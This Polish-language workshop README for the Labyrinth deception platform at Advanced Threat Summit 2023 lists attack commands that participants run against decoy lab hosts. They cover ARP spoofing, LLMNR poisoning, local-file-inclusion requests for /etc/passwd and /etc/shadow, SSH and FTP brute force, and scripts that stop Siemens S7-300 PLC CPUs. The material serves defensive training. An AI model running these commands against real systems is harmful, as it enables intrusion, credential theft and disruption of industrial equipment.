# Witamy na Advanced Threat Summit 2023

Wszystko, czego możesz potrzebować podczas warsztatów, jest dostępne w tym repozytorium.

## Uzyskiwanie dostępu

Na początek przejdź do naszego stanowiska testowego:

1. **Poświadczenia do AdminVM** - możesz użyć dowolnej przeglądarki internetowej:
```
URL: 
Username:
Password:  
```
2. **Poświadczenia do atakującego hosta** - z tego hosta będziesz przeprowadzać ataki. Użyj SSH i następujących
Poświadczeń: 
```
Host:
Username:
Password:
```
## Terminologia, która będzie dzisiaj używana
Ze względu na fakt, że dziś używamy platformy Labyrinth Deception jako przykładu platformy cyber decepcji, ma ona swoje własne terminy, które będą dziś aktywnie wykorzystywane::

1.	**Point (Punkt)** = wabik sieciowy, przynęta, spreparowane usługi sieciowe.
> [!NOTE]
> Punkt NIE JEST oddzielną maszyną wirtualną.

2.	**Honeynet** = segment sieci, w którym działają Punkty. Służy do określenia sieci VLAN, w której mają działać Punkty.

3.	**Seeder	Tasks** = wabiki plikowe, nawigacja okruszkowa używana do logicznego łączenia prawdziwej i spreparowanej infrastruktury.

4.	**Seeder Agent** = program, który rozprowadza Seeder Tasks na rzeczywistych hostach.
5. **AdminVM (konsola zarządzania)** = główny moduł kontrolujący system.
6. **WorkerVM (węzeł roboczy)** = węzeł, na którym uruchomione są Punkty.

## Transkrypcja poleceń
Ponadto udostępniamy transkrypcję wszystkich poleceń, aby ułatwić korzystanie z nich. Nawet jeśli przegapiłeś jakąkolwiek część prezentacji, możesz skorzystać z tych notatek, aby kontynuować ćwiczenia.

> [!IMPORTANT]
> **\<any data>** wskazuje, że należy wkleić własne dane, które są wymienione wewnątrz nawiasów.
>
> **[options]** wskazuje, że ta część (lub części) polecenia jest opcjonalna i może zostać pominięta. Wybór wielu opcji jest wyświetlany za pomocą / (ukośnika).

#### Przypadek 1: wykrywanie skanowania sieci
```
nmap [-sS/sT/sW/sM/sU/sF/sX] ​<Point IP>
```
#### Przypadek 2: łączenie się z hostem przy użyciu danych z wabików plikowych (breadcrumbs)

1. Przejdź do Seeder Agents -> Tasks
2. Wybierz ssh_txt_credentials lub ssh_config z listy
3. Kliknij w trzykropek, a następnie Details
4. Użyj tych poświadczeń, aby się zalogować:
```
ssh <user>@<Point IP>
```
#### Przypadek 3: ARP spoofing

```
sudo ettercap -i <interface> -T -M arp /<host 1>// /<host2>//
```
Alternatywnie można użyć bettercap:
```
sudo bettercap
net.probe on
net.show
set arp.spoof.targets <Point IP>
set arp.spoof.fullduplex false
arp.spoof on
// after some time
arp.spoof off
```
Odnośnik: [ettecap](https://www.ettercap-project.org/) i [bettercap](https://github.com/bettercap/bettercap) source

#### Przypadek 4: LLMNR / NBT-NS Poisoning

W tym celu użyjemy programu *Responder*. Jest on już zainstalowany. Wszystko, co musisz zrobić, to uruchomić polecenie:
```
cd Responder
sudo python2 Responder.py -I eth0
```
Odnośnik: [Responder source](https://github.com/SpiderLabs/Responder)

#### Przypadek 5: S7comm Malformed PDU

W tym przypadku istnieje [skrypt](https://github.com/ad-labyrinth/ATS2023/blob/main/scripts/S7_Malformed_PDU.py) dostępny w tym repozytorium - wystarczy go uruchomić:

```
cd S7_malformed_PDU
python3 S7_malformed_PDU.py -a <Point IP>
```
Lub:
```
cd S7_malformed_PDU
python3 S7_malformed_PDU.py --plc_ip_addr <Point IP>
```

#### Przypadek 6: Lokalne dołączanie plików
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
```
#### [Zaawansowany] Przypadek 7: ponowne użycie poświadczeń

1. Znajdź serwer WWW
```
sudo nmap -sS -sC -p80,443 <Honeynet IP> -vvv
```
2. Eksploruj znaleziony serwer WWW

Wykonaj LFI
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
```
Lub:
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/shadow 
```
Wyszukaj dodatkową ścieżkę internetową:
```
dirsearch --wordlists=/home/user/wordlists/directories.txt -u https://<Point IP>/ 
```
Odnośnik: [dirsearch](https://github.com/maurosoria/dirsearch)
3. Skonfiguruj listę słów
```
cd wordlists
nano brute.dict
```
4. Wykonaj bruteforce SSH
```
hydra -L brute.dict -P passwords.dict <IP of the ssh host> ssh -t 4 
```
5. Zaloguj się do hosta
```
ssh <user>@<Point IP>
```
6. Ponowne użycie poświadczeń do połączenia z innym hostem
```
ssh <user>@warrior.labyrinth.tech
```

#### [Zaawansowany] Przypadek 8: atakowanie sieci przemysłowych

1. Przeszukanie sieci w poszukiwaniu serwera FTP
```
sudo nmap -sS -sC -p21 -T4 <Honeynet subnet> -vvv 
```
2. Połącz się z serwerem FTP

Spróbuj połączyć się anonimowo:
```
ftp <FTP IP address>
```
Wykonaj bruteforce FTP:
```
cd wordlists
nmap --script ftp-brute -p21 <FTP IP address> --script-args userdb=users.dict,passdb=passwords.dict
```
3. Sprawdź znaleziony plik
```
ls -la
less <file>
```
4. Wykonać żądanie sterowania CPU S7comm
```
cd S7_scripts
python2 s7300stop.py <S7-300 IP>
```
Ponadto można spróbować uruchomić komunikat startowy CPU:
```
python2 s7300cpustart.py <S7-300 IP>
```

Odnośnik: [exploits source](https://github.com/hackerhouse-opensource/exploits)

## Informacje o platformie Labyrinth 
Labyrinth to zespół doświadczonych inżynierów cyberbezpieczeństwa i testerów penetracyjnych, który specjalizuje się w opracowywaniu rozwiązań do wczesnego wykrywania i zapobiegania cyberzagrożeniom.

Techniki decepcji zapewniają atakującym zasadniczą przewagę nad obrońcami, którzy nie są w stanie przewidzieć kolejnego ruchu napastników. **NASZĄ WIZJĄ** jest przesunięcie układu sił na korzyść obrońców.

**NASZĄ MISJĄ** jest dostarczenie wszelkiego rodzaju organizacjom prostego i wydajnego narzędzia do jak najwcześniejszego wykrywania napastników wewnątrz sieci korporacyjnej.

Więcej informacji o platformie: https://labyrinth.tech/ 
